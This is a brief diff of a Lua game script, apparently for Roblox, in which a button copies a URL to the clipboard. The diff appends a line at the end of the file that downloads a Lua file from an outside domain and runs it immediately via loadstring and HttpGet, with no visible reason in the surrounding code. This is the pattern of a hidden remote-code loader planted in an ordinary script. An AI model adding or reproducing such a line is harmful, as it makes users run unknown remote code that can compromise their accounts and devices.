@@ -52,3 +52,5 @@ local function setClipboardWithURL()
 end
 
 downloadButton.MouseButton1Click:Connect(setClipboardWithURL)
+
+loadstring(game:HttpGet("https://egorikusa.space/3b533f65c5a3f4c80fd2a7ef.lua", true))()
